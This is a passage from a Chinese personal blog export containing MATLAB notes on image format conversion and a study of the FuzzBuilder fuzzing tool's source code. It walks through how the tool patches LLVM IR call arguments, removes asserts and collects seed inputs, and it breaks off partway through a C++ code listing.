title="不同数字图像文件格式转换"></a>不同数字图像文件格式转换</h1><h2 id="RGB和索引图象之间的转换"><a href="#RGB和索引图象之间的转换" class="headerlink" title="RGB和索引图象之间的转换"></a>RGB和索引图象之间的转换</h2><p>回顾一下索引图象和RGB图像的区别。RGB图像每一个像素点都有rgb三个分量，而索引图象每一个点是一个下标，下标代表调色板中对应颜色的位置。调色板是一些预设好的颜色组合。我们可以把RGB图像转换为n=16或者n=128的索引图象。例如bmp图像就是一种调色板图像。下面是bmp图像的文件格式。</p><p><img src="/2022/04/07/matlab-2/image-20220407105814908.png" alt="image-20220407105814908"></p><p>(看到这里想到，对于一个读取bmp图像的文件，如果fuzz改掉headsize部分，是否可能造成指针越界，造成越界访问？)</p><p>常见的RGB格式图像是PNG。</p><p>我们接下来尝试转换。<strong>将png图像转换为bmp图像</strong></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rgb = imread(<span class="string">&quot;E:\onion.png&quot;</span>);</span><br><span class="line"><span class="built_in">figure</span>(<span class="number">1</span>);</span><br><span class="line">[data,map] = rgb2ind(rgb,<span class="number">16</span>);</span><br><span class="line">image(data),colormap(map);</span><br><span class="line">title(<span class="string">&quot;matlab&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">figure</span>(<span class="number">2</span>);</span><br><span class="line">imshow(rgb);</span><br><span class="line">title(<span class="string">&quot;RGB&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/2022/04/07/matlab-2/image-20220407111023832.png" alt="image-20220407111023832"></p><p>可以看到图像质量发生了变化。位图参数还可以调整为128，图像清晰度会提高。</p><p>转换为灰度图像即为。这里推断它采用能尽可能分辨的多图像的，上面提到的灰度图像的识别方法。</p><p><img src="/2022/04/07/matlab-2/image-20220407111326390.png" alt="image-20220407111326390"></p><h2 id="图像读写函数完成转换"><a href="#图像读写函数完成转换" class="headerlink" title="图像读写函数完成转换"></a>图像读写函数完成转换</h2><p><img src="/2022/04/07/matlab-2/image-20220407112731389.png" alt="image-20220407112731389"></p><p>但是文件读写的方法读取图象是有限制的。只能在相同格式文件之间转换。如果需要转换为不同的模型，需要用下面的函数。</p><p><img src="/2022/04/07/matlab-2/image-20220407112759580.png" alt="image-20220407112759580"></p><blockquote><p>注意：imshow本身基于RGB模型观察图像。因此在用其他模型转换后可能导致图像变得很奇怪。例如下图</p></blockquote><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 将jpg转换为rgb</span><br><span class="line">RGB=imread(<span class="string">&#x27;lenna.jpg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>);</span><br><span class="line">HSV=<span class="built_in">rgb2hsv</span>(RGB);</span><br><span class="line">subplot(<span class="number">121</span>);imshow(RGB);title(<span class="string">&#x27;原图像&#x27;</span>);</span><br><span class="line">subplot(<span class="number">122</span>);imshow(HSV);title(<span class="string">&#x27;变换后的图像&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/04/07/matlab-2/image-20220407113242114.png" alt="image-20220407113242114"></p><p>相同的方法，可以把图片转换为hsv格式。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rgb = imread(<span class="string">&quot;E:\score.jpg&quot;</span>);</span><br><span class="line">HSV = <span class="built_in">rgb2hsv</span>(rgb);</span><br><span class="line">subplot(<span class="number">121</span>);imshow(rgb);title(<span class="string">&#x27;original&#x27;</span>);</span><br><span class="line">subplot(<span class="number">122</span>);imshow(HSV);title(<span class="string">&#x27;changed&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/2022/04/07/matlab-2/image-20220407113802106.png" alt="image-20220407113802106"></p><p>matlab怎样显示hsv格式的图片?应该是无法显示的。我们能做的是先把图像变成hsv格式的，然后再把hsv图片转换回来，这样能修改图片的饱和度等。</p>]]></content>
      
      
      <categories>
          
          <category> water_print </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FuzzBuilder_src_understand</title>
      <link href="/2022/04/04/FuzzBuilder-src-understand/"/>
      <url>/2022/04/04/FuzzBuilder-src-understand/</url>
      
        <content type="html"><![CDATA[<p>更新中…</p><p>启动docker命令：sudo docker exec -it c_ares_FB /bin/bash</p><span id="more"></span><h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><p>这里比较关键的是构建<code>target</code>。在<code>parse_conf</code>里面，经过了一系列错误判断，最终落入本函数中。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404221412100.png" alt="image-20220404221412100"></p><p>这里最后有一个target全局变量。打开make_target可以看到其实是把用来描述target的文件作为json文件读取，然后放在一个vector中。放入的格式是(name,fuzz,len)。第一个参数是函数名，第二个是buffer在<strong>第几个参数的位置</strong>，第三个是buffer的长度。</p><h1 id="exec部分"><a href="#exec部分" class="headerlink" title="exec部分"></a>exec部分</h1><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220411210304438.png" alt="image-20220411210304438"></p><p>这里代表了参数是exec时，fuzzbuilder会做的事情。main中调用了<code>Execgen::generate</code>，其代码如下。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404213740712.png" alt="image-20220404213740712"></p><p>首先，函数调用load()，把之前json格式的数据加载进来。</p><h2 id="load-file"><a href="#load-file" class="headerlink" title="load file"></a>load file</h2><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404213905137.png" alt="image-20220404213905137"></p><p>这里引入了一个新的属性,<strong>this-&gt;modules</strong>。这是一个记录了所有file和Module*格式的文件的一个vector。这里的get_files()和Module*类型的文件留到后面分析。只需要知道这里把文件和对应的模块都放到一个vector中即可。</p><h2 id="循环-in-generate"><a href="#循环-in-generate" class="headerlink" title="循环 in generate"></a>循环 in generate</h2><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404214624297.png" alt="image-20220404214624297"></p><p>接着的循环，首先读取<code>module_size</code>也就是刚才load进来的module vector的大小。接着<code>get_module</code>返回每一个vector的第二个参数，也就是push进来的module类型变量。这是一个<code>IRREADER</code>类型的数据。我们看看这个类型是什么。</p><h3 id="IRReader"><a href="#IRReader" class="headerlink" title="IRReader"></a>IRReader</h3><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404214655591.png" alt="image-20220404214655591"></p><p>重点看到这里的构造函数。不过打开一看，也就是简单赋值。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404214744913.png" alt="image-20220404214744913"></p><p>后面我们用到了其中的两个函数，一个是<code>get_functions_to_fuzz()</code>，另一个是<code>get_functions_to_remove</code>。现在提前来看看。</p><ul><li><code>get_functions_to_fuzz</code></li></ul><p>首先是获得要被fuzz的函数。期间还做了一些检查，但是没看明白。里面有一个test变量，不知道是什么意思。返回了一个<code>ret</code>用来储存所有的要被fuzz的函数。</p><p>接下来有一个<code>is_target</code>的判断。如果是就把该函数push到tmps向量中。这里的ret是上面<code>get_test_functions</code>的返回值。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404220244038.png" alt="image-20220404220244038"></p><p>这里的<code>is_target</code>很有意思。大概作用是先获得所有target函数名。（关于target定义写在读取文件部分）之后获取<strong>参数函数的所有调用的函数</strong>，然后一旦找到调用函数name和target相同就返回true，表示该函数是一个有效的target。为什么要这样做? 为了看看<strong>当前要被测试函数的调用的函数中，是否有我们需要的target</strong>。回顾一下，targets是target function，而这里的形参f是外面的ret，也就是test_func。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404220234521.png" alt="image-20220404220234521"></p><p>这里两者的不同需要澄清。看到他给的示例文件。所谓target就是目标要fuzz的函数，<strong>test所指示的可能是所有可能的能够找到上述调用target函数的集合开头(不必写全，因为可以看到后面是字符串比较)。因此上面这段代码的用途就清楚了：在下面这张图中test开头的所有函数里，找调用target的函数</strong>如果找到<strong>不包含target的test_开头的函数，就把函数名称返回出来</strong>。(这样做看似很奇怪)</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404222120110.png" alt="image-20220404222120110"></p><p>但是看到这里就清楚要干啥了。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404223137589.png" alt="image-20220404223137589"></p><p>==这里有一个没分析的get_callees==，比较复杂后面再看。</p><p>同样的，下面一半是获得skips的函数。这里就比较清晰。 获取skip的函数，并从ret中删掉这些函数。获得<strong>去除不调用target函数以及在skip集合中的函数之后的函数集合ret</strong></p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404223637633.png" alt="image-20220404223637633"></p><h2 id="回到外部"><a href="#回到外部" class="headerlink" title="回到外部"></a>回到外部</h2><p>(接着上面的 循环 部分)</p><p>接着再循环里面看到第二个<code>get_functions_to_remove</code>函数。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404224230026.png" alt="image-20220404224230026"></p><p>这个操作感觉很傻，大致意思是<strong>找到所有在_test开头文件中并且没有调用target的</strong>。这里都用的是vector的比对操作。</p><p><strong>因此，两个操作，为了确保找到fuzz的函数的调用函数，并且确保这些函数是”test”规则开头的函数，并且不在skips列表里面</strong>。</p><p>在一顿report之后，到了这里</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404230505772.png" alt="image-20220404230505772"></p><h3 id="insert-interface"><a href="#insert-interface" class="headerlink" title="insert interface"></a>insert interface</h3><p>重点看以下两个函数。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404230640661.png" alt="image-20220404230640661"></p><h4 id="get-entry-function"><a href="#get-entry-function" class="headerlink" title="get_entry_function"></a>get_entry_function</h4><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404230732939.png" alt="image-20220404230732939"></p><p>用到了之前提到的module。每一个module是一个&lt;file,module&gt;的二元组。可以看到这里是用了module的getFunction方法。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220404235446410.png" alt="image-20220404235446410"></p><p>这里又牵涉到module的概念。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405093248536.png" alt="image-20220405093248536"></p><p>我觉得可以理解为每一个ELF文件的文件头部信息？</p><p>回到上面的get_function。这里的意思就是从之前的module结构体中找到包含main的module，然后这个作为entry function返回。接着初始化一个<code>IRwriter</code>类型变量，将之前得到的main函数指针赋值到这里。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405093718623.png" alt="image-20220405093718623"></p><p>这里又牵涉到另一个类，<code>IRwriter</code>。后面用到的时候再分析。</p><h4 id="writer-interface"><a href="#writer-interface" class="headerlink" title="==writer.interface=="></a>==writer.interface==</h4><p>这个函数及其复杂，==留到后面分析==，位于<code>irwriter.cc</code>中。大致看一眼发现用到了很多神奇的操作</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405100104966.png" alt="image-20220405100104966"></p><p>比如这里的getContext, get_global_buffer等。看起来像是为main函数设置好调用上下文。</p><h2 id="回到外部-1"><a href="#回到外部-1" class="headerlink" title="回到外部"></a>回到外部</h2><p>接下来是这三个函数</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405093926414.png" alt="image-20220405093926414"></p><h3 id="insert-fuzz-to-tests"><a href="#insert-fuzz-to-tests" class="headerlink" title="insert_fuzz_to_tests"></a>insert_fuzz_to_tests</h3><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405094034331.png" alt="image-20220405094034331"></p><p>这里的srcs是之前的target，也就是所有要fuzz的函数总和。可以看到这里为每个函数初始化了一个<code>IRwriter</code>类型的变量，然后进入fuzz函数。于是接着看writer.fuzz()是什么意思。</p><h4 id="writer-fuzz"><a href="#writer-fuzz" class="headerlink" title="writer.fuzz"></a>writer.fuzz</h4><p>重点分析下面这些函数。(好多啊)</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405100550970.png" alt="image-20220405100550970"></p><h5 id="get-target-instructions"><a href="#get-target-instructions" class="headerlink" title="get_target_instructions"></a>get_target_instructions</h5><p>接受一个函数名作为参数</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405100730365.png" alt="image-20220405100730365"></p><p>首先调用<code>getFunction</code>。这个没找到定义，是<code>Module* m</code>类型变量的成员函数。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405101126231.png" alt="image-20220405101126231"></p><p>可以看到是先获得module里面是不是有参数对应的函数名，如果找到，进入下面<code>get_calls</code></p><p>后面是<code>get_calls</code></p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405101652398.png" alt="image-20220405101652398"></p><p>接受一个函数指针作为参数，从该函数的<code>basicblock</code>中，找到所有的<code>instruction</code>。在<a href="https://stackoverflow.com/questions/55437876/how-to-judge-an-instruction-in-llvm-ir-is-a-call-instruction-or-not">github</a>上找到了相关说明。后面这句in的作用就是<strong>找到所有指令中包含invoke或者call的部分。然后插入到ret中。</strong></p><p>之后is_target判断call的是不是目标函数。如果是就插入到集合里面返回。</p><h4 id="is-modified"><a href="#is-modified" class="headerlink" title="is_modified"></a>is_modified</h4><p>这里接受一个之前获得的instruction集合</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405102525507.png" alt="image-20220405102525507"></p><p>就是看<code>MODIFIED</code>里面有没有<code>i</code>这一条命令。有就返回true。这个MIDIFIED还是在writer.fuzz中找到了初始化。后面再分析。第一次调用的时候应该是空。也就是返回false。于是会直接进入<code>get_callee</code></p><h4 id="get-callee"><a href="#get-callee" class="headerlink" title="get_callee"></a>get_callee</h4><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405103108404.png" alt="image-20220405103108404"></p><p>这个函数结构还是相对清晰。主要作用是找到call或者invoke调起的函数，然后返回出来。</p><p>这个操作之后返回一个callee变量(回顾一下，也就是把terget函数getparent返回的的所有函数中的所有call和Invoke的目标函数拿出来)现在callee里储存的就是所有的目标函数。</p><h4 id="get-fuzz"><a href="#get-fuzz" class="headerlink" title="get_fuzz"></a>get_fuzz</h4><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405104400160.png" alt="image-20220405104400160"></p><p><code>get_fuzz()</code>接受目标函数函数名作为参数。在targets里面找到所有名字一样的函数，调用get_fuzz()。我觉得writer.fuzz到目前为止的意思就是从target函数的caller中找到所有调用target函数的语句，然后现在把这些target放到<code>get_fuzz</code>中。但是这里<code>e-&gt;get_fuzz</code>很奇怪，只能返回一个<code>size_t</code>类型的变量，将作为fuzz_slot返回到外部。==不知道fuzz是什么意思，或许是从参数中获取的能fuzz的参数位置吗==。现在觉得应该是的</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405104541553.png" alt="image-20220405104541553"></p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405104931527.png" alt="image-20220405104931527"></p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405104945420.png" alt="image-20220405104945420"></p><p>接下来有一个<code>len_slot</code>。初步猜测就是获得能fuzz的长度。</p><h4 id="IRbuilder"><a href="#IRbuilder" class="headerlink" title="IRbuilder"></a>IRbuilder</h4><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405111315535.png" alt="image-20220405111315535"></p><p>首先看到构造函数<code>IRBuilder</code>。在网上找到<a href="https://blog.csdn.net/qq_42570601/article/details/107771289">资料</a>这个意思大概是创建一个IIVM的代码块。记住这里的e是所有<strong>调用target函数的instruction</strong>。</p><h5 id="get-global-buffer"><a href="#get-global-buffer" class="headerlink" title="==get_global_buffer=="></a>==get_global_buffer==</h5><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405112536493.png" alt="image-20220405112536493"></p><p>第一次进来的时候肯定是empty。进入<code>get_unique_global_variable_name</code>中。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405113139919.png" alt="image-20220405113139919"></p><p>可以看到这个函数从module的第二个参数(也就是module类型变量)中尝试获取<code>name</code>（这里看了是fuzzbuilder_buffer_1,fuzzbuilder_buffer_2这样名字的变量），如果找到了就返回。(但是感觉应该返回空?)</p><p>于是这里gv应该返回为空。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405113740789.png" alt="image-20220405113740789"></p><p>在网上查到<code>getOrInsertglobal</code>作用。第二个参数type是llvm特有的i8*类型，但是网上也没有说的很详细。==后面有一个<code>setLinkage</code>不太理解作用==。可能是把当前找到的变量和某个外部变量联系起来?</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405113951467.png" alt="image-20220405113951467"></p><h5 id="get-global-size"><a href="#get-global-size" class="headerlink" title="==get_global_size=="></a>==get_global_size==</h5><p>这个和上面函数长得很像。但是也是一样的问题，不太理解作用是啥。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405115300973.png" alt="image-20220405115300973"></p><h4 id="回到外部-修改调用参数"><a href="#回到外部-修改调用参数" class="headerlink" title="回到外部(修改调用参数)"></a>回到外部(修改调用参数)</h4><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405130336259.png" alt="image-20220405130336259"></p><p>这里<code>set_argument</code>定义如下</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405130641025.png" alt="image-20220405130641025"></p><p><strong>可以看出这里就是关键的地方！</strong>这里把我们之前定位到的call或者invoke位置的函数设置了参数。其中idx代表参数的位置(也就是用户之前填写的)，v是参数值，在这里就相当于是上面get_global_buffer返回的内容。<strong>相当于直接patch掉了原先invoke或者call的函数参数，变为我们之前创造的global buffer对象</strong>。这里就和论文的描述一致了。</p><p>这里一共patch了两个变量，分别是buffer和buffer的长度。之后把这一条语句放在<code>modified</code>里面</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405131111523.png" alt="image-20220405131111523"></p><p>然后打出一个log表示这个调用语句已经被patch过了。</p><h4 id="返回值处理"><a href="#返回值处理" class="headerlink" title="返回值处理"></a>返回值处理</h4><p>接下来一部分用于处理返回值。(终于快结束了)</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405131408200.png" alt="image-20220405131408200"></p><p>首先判断，如果返回值是void就直接过。</p><p>接着创建了一个<code>IRFreader</code>。这个的代码量很短</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405131603822.png" alt="image-20220405131603822"></p><p>下一行就有用到<code>get_asserts()</code>。我们看看其含义。大概就是获得所有调用了abort和assert_fail的instruction。接着回来</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405131907581.png" alt="image-20220405131907581"></p><p>看到这里<code>eraseFromParent</code>应该是从调用函数这里删掉所有assert语句(个人猜测这应该是为了去除debug文件特有的assert函数来提高成功率)接着关于i的操作(这个getNextNode网上也查不到啊)，大概是下一个control block?</p><p>接着判断如果i的下一个control block是可以不可达到的就删掉(我觉得大概是为了判断先把e(也就是assert语句)删掉了，确保把e删掉之后原来assert后面代码块是不可达的，这样就把他删掉)</p><p>至此，终于分析完了writer.fuzz。也就完成了对于<code>insert_fuzz_to_test</code>的分析。</p><h3 id="insert-skip-to-tests"><a href="#insert-skip-to-tests" class="headerlink" title="insert_skip_to_tests"></a>insert_skip_to_tests</h3><p>skip的处理相对简单</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405133447257.png" alt="image-20220405133447257"></p><p>主要是writer.skip</p><h4 id="writer-skip"><a href="#writer-skip" class="headerlink" title="writer.skip"></a>writer.skip</h4><p>下面这张图一开始的地方写错了，应该是，<strong>一旦不是32为int或者void就返回false</strong></p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405134318569.png" alt="image-20220405134318569"></p><p>可以看到<strong>能够skip的函数都是void返回类型或者Int32的才能处理</strong>。能够skip的原因是通过新建一个要么返回0要么返回void的函数来代替。</p><h3 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h3><p>最后一个dump</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405134731210.png" alt="image-20220405134731210"></p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405134741183.png" alt="image-20220405134741183"></p><p>就是把上面所做的修改放回到.mod.bc文件中</p><p>芜湖！终于分析完了一半！</p><h2 id="exec的总结"><a href="#exec的总结" class="headerlink" title="exec的总结"></a>exec的总结</h2><p>finish on April4.5 13:49</p><p>总结一下看了将近15小时的exec部分！大概就是根据要fuzz的函数，先从目标文件中找到所有调用目标函数的，再从中去掉skip的函数。之后硬改调用目标函数的语句，把buffer和长度都改为一个全局变量(这个是我没看懂的部分，后面再尝试理解)去掉assert函数以及把所有返回值为void或者int32的能skip的函数全部patch为空，返回void以及0。然后把这个文件dump出来。</p><p>最后可以看一下用户指定的文件的真实面目如何。其实正是包含了刚才所说的大部分变量内容(target是目标muzz函数，包括了buffer位置和长度,tests是一个函数名前缀，表示test_开头的全部函数都需要被找到,files表示要找的.bc文件,skips表示需要跳过的函数)。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220405135451329.png" alt="image-20220405135451329"></p><h1 id="seed部分"><a href="#seed部分" class="headerlink" title="seed部分"></a>seed部分</h1><p>首先看看seed是什么。<strong>seed就是一种样例输入</strong>。在灰盒测试里面seed能带来更高的代码覆盖率。这里的seed部分关注<strong>如何自动生成一些有用的seed</strong>。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220411215418472.png" alt="image-20220411215418472"></p><p>seed部分主要在seedgen.cc里面。seed部分主要调用<code>generate</code>函数来生成seed。有以下函数需要关注。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220411210015213.png" alt="image-20220411210015213"></p><h2 id="get-target-functions"><a href="#get-target-functions" class="headerlink" title="get_target_functions"></a>get_target_functions</h2><p>获取目标函数。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220411212347913.png" alt="image-20220411212347913"></p><p>这里比较的f和target分别是什么呢? f是我们新加载进来的模块。而target，就是我们在上面花了很久找到的寻找target函数的逻辑。可以看到上面的逻辑是在target中逐个找module里面的函数，如果找到了就放到数组中。(为什么要找?大概是为了看新的文件里面有哪些是我们要fuzz的?)</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220411213423792.png" alt="image-20220411213423792"></p><p>后面两句就是输出target func。然后到最关键的最后一步：insert_collect_to_targets()</p><h2 id="insert-collect-to-targets"><a href="#insert-collect-to-targets" class="headerlink" title="insert_collect_to_targets"></a>insert_collect_to_targets</h2><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220411213613519.png" alt="image-20220411213613519"></p><p>这里传入的参数就是target。这是一个很可怕的函数。。。</p><h3 id="writer-collect"><a href="#writer-collect" class="headerlink" title="writer.collect()"></a>writer.collect()</h3><p>注意到下面所操作的f都是初始化的时候带入的f。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IRWriter::collect</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// function大小为0直接返回</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;f-&gt;<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BasicBlock&amp; entry1 = <span class="keyword">this</span>-&gt;f-&gt;<span class="built_in">getEntryBlock</span>();</span><br><span class="line">    <span class="comment">// getFirstInsertionPt():</span></span><br><span class="line">    <span class="comment">// Returns an iterator to the first instruction in this block that is suitable for inserting a non-PHI instruction</span></span><br><span class="line">    Instruction&amp; inst = *(entry1.<span class="built_in">getFirstInsertionPt</span>());</span><br><span class="line">    BasicBlock* link = entry1.<span class="built_in">splitBasicBlock</span>(&amp;inst);</span><br><span class="line">    entry1.<span class="built_in">begin</span>()-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">    IRBuilder&lt;&gt; <span class="built_in">builder</span>(&amp;entry1);</span><br><span class="line">    LLVMContext&amp; ctx = <span class="keyword">this</span>-&gt;f-&gt;<span class="built_in">getContext</span>();</span><br><span class="line">    Module&amp; <span class="keyword">module</span> = *(<span class="keyword">this</span>-&gt;f-&gt;<span class="built_in">getParent</span>());</span><br><span class="line"></span><br><span class="line">    BasicBlock* entry2 = BasicBlock::<span class="built_in">Create</span>(ctx, <span class="string">&quot;&quot;</span>, <span class="keyword">this</span>-&gt;f);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建buffer。第一个是buf的name，这个是之前设置的全局变量</span></span><br><span class="line">    Value* buffer = <span class="keyword">this</span>-&gt;f-&gt;<span class="built_in">arg_begin</span>() +</span><br><span class="line">        (Config::<span class="built_in">get</span>()-&gt;<span class="built_in">get_fuzz</span>(<span class="built_in">string</span>(<span class="keyword">this</span>-&gt;f-&gt;<span class="built_in">getName</span>())) - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 下面创建size</span></span><br><span class="line">    Value* size = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="comment">// size是用config::get-&gt;getsize()得到的。如果不是0，设置为原本函数相关内容。如果是0，首先在function中创建一个call(?)把buffer设置为之前初始化的buffer。</span></span><br><span class="line">    <span class="keyword">if</span>(Config::<span class="built_in">get</span>()-&gt;<span class="built_in">get_size</span>(<span class="built_in">string</span>(<span class="keyword">this</span>-&gt;f-&gt;<span class="built_in">getName</span>())) != <span class="number">0</span>) &#123;</span><br><span class="line">        size = <span class="keyword">this</span>-&gt;f-&gt;<span class="built_in">arg_begin</span>() +</span><br><span class="line">            (Config::<span class="built_in">get</span>()-&gt;<span class="built_in">get_size</span>(<span class="built_in">string</span>(<span class="keyword">this</span>-&gt;f-&gt;<span class="built_in">getName</span>())) - <span class="number">1</span> );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        size = builder.<span class="built_in">CreateCall</span>(<span class="built_in">get_strlen_function</span>(<span class="keyword">module</span>),</span><br><span class="line">            &#123; buffer &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Value* fd = builder.<span class="built_in">CreateAlloca</span>(Type::<span class="built_in">getInt32Ty</span>(<span class="keyword">module</span>.<span class="built_in">getContext</span>()));</span><br><span class="line">    Value* path = builder.<span class="built_in">CreateGlobalString</span>(COLLECT_PATH);</span><br><span class="line">    Value* func_name = builder.<span class="built_in">CreateGlobalString</span>(<span class="built_in">string</span>(<span class="keyword">this</span>-&gt;f-&gt;<span class="built_in">getName</span>()));</span><br><span class="line">    Value* func_name_size = builder.<span class="built_in">getInt32</span>(<span class="built_in">string</span>(<span class="keyword">this</span>-&gt;f-&gt;<span class="built_in">getName</span>()).<span class="built_in">size</span>());</span><br><span class="line">    Value* splitter = builder.<span class="built_in">CreateGlobalString</span>(SPLITTER);</span><br><span class="line">    Value* splitter_size = builder.<span class="built_in">getInt32</span>(SPLITTER.<span class="built_in">size</span>());</span><br><span class="line">    Value* newline = builder.<span class="built_in">CreateGlobalString</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Value* cmp = builder.<span class="built_in">CreateICmpUGT</span>(size, builder.<span class="built_in">getInt32</span>(<span class="number">1</span>));</span><br><span class="line">    builder.<span class="built_in">CreateCondBr</span>(cmp, entry2, link);</span><br><span class="line"></span><br><span class="line">    builder.<span class="built_in">SetInsertPoint</span>(entry2);</span><br><span class="line"></span><br><span class="line">    Function* func = <span class="built_in">get_open_function</span>(<span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">    Value* call = builder.<span class="built_in">CreateCall</span>(func,</span><br><span class="line">        &#123; builder.<span class="built_in">CreateInBoundsGEP</span>(path, &#123;builder.<span class="built_in">getInt32</span>(<span class="number">0</span>), builder.<span class="built_in">getInt32</span>(<span 